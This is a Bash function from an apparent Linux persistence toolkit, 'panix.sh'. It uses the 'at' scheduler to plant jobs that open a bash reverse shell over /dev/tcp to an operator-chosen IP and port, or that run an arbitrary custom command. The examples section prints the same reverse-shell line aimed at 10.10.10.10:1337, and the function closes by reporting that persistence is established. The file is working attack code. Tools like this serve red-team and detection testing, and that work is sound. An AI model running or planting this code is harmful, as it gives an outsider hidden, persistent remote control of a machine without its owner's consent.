setup_at() {
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local time=""

	usage_at() {
		echo "Usage: ./panix.sh --at [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default at settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
		echo "--custom                     Use custom at settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
        echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--time )
				shift
				time=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
				exit 0
				;;
			--help|-h)
				usage_at
				exit 0
				;;
			* )
				echo "Invalid option for --at: $1"
				echo "Try './panix.sh --at --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port || -z $time ]]; then
			echo "Error: --ip, --port, and --time must be specified when using --default."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $time ]]; then
			echo "Error: --command and --time must be specified when using --custom."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "$command" | at $time
	else
		echo "Error: Either --default or --custom must be specified for --at."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	fi

	echo "[+] At job persistence established!"
}
